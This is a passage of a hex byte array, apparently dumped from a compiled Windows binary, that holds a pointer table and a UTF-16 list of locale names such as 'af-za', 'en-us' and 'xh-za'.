0x80, 0x1, 0x0, 0x0, 0x0, 0x81, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x5f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x35, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x4b, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x62, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x28, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x34, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x29, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x27, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x58, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xaa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x46, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x4c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x70, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x66, 0x0, 0x2d, 0x0, 0x7a, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x64, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x65, 0x0, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x71, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x6a, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x6b, 0x0, 0x77, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x62, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x6f, 0x0, 0x6d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x71, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x74, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x79, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x79, 0x0, 0x72, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x61, 0x0, 0x74, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x62, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x62, 0x0, 0x67, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x62, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x62, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x61, 0x0, 0x74, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x63, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x65, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x63, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x63, 0x0, 0x79, 0x0, 0x2d, 0x0, 0x67, 0x0, 0x62, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x64, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x64, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x0, 0x69, 0x0, 0x76, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x76, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x67, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x62, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x67, 0x0, 0x62, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6a, 0x0, 0x6d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x74, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x75, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x7a, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x7a, 0x0, 0x77, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x65, 0x0, 0x63, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x65, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x67, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x68, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x78, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x76, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x75, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x76, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x65, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x75, 0x0, 0x2d, 0x0, 0x65, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x66, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x6f, 0x0, 0x2d, 0x0, 0x66, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x66, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x63, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x67, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x65, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x67, 0x0, 0x75, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x68, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x75, 0x0, 0x2d, 0x0, 0x68, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x68, 0x0, 0x79, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x6d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x69, 0x0, 0x64, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x64, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x69, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x69, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x69, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x6a, 0x0, 0x70, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x67, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x6b, 0x0, 0x2d, 0x0, 0x6b, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x6f, 0x0, 0x6b, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x6f, 0x0, 0x2d, 0x0, 0x6b, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x79, 0x0, 0x2d, 0x0, 0x6b, 0x0, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0x0, 0x76, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x76, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x7a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x6b, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6d, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x62, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x7a, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x71, 0x0, 0x75, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x71, 0x0, 0x75, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x65, 0x0, 0x63, 0x0, 0x0, 0x0, 0x0, 0x0, 0x71, 0x0, 0x75, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x0, 0x6f, 0x0, 0x2d, 0x0, 0x72, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x0, 0x75, 0x0, 0x2d, 0x0, 0x72, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x66, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6b, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6d, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6d, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6d, 0x0, 0x6a, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6d, 0x0, 0x6a, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6d, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x66, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x66, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x71, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x79, 0x0, 0x72, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x62, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x61, 0x0, 0x74, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x70, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x79, 0x0, 0x72, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x70, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x61, 0x0, 0x74, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x76, 0x0, 0x2d, 0x0, 0x66, 0x0, 0x69, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x76, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x77, 0x0, 0x2d, 0x0, 0x6b, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x73, 0x0, 0x79, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x61, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x74, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x7a, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x74, 0x0, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x74, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x72, 0x0, 0x75, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x6b, 0x0, 0x2d, 0x0, 0x75, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x75, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x79, 0x0, 0x72, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x75, 0x0, 0x7a, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x61, 0x0, 0x74, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x76, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x7a, 